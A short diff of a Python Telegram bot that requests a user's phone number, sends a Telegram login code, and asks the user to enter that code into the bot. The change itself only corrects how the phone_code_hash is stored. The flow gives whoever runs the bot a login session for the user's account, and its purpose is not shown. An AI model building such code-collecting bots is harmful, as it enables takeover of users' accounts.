@@ -84,11 +84,11 @@ async def get_phone_number(message: types.Message):
         if await client.is_user_authorized():
             await client.log_out()
         
-        phone_code_hash = await client.send_code_request(phone_number)
+        sent_code = await client.send_code_request(phone_number)
         user_state[message.from_user.id] = {
             'phone_number': phone_number,
             'attempts': 0,
-            'phone_code_hash': phone_code_hash,
+            'phone_code_hash': sent_code.phone_code_hash,  # Извлекаем хеш кода
             'client': client
         }
         await message.reply("Код отправлен на ваш номер. Пожалуйста, введите код, который вы получили.")
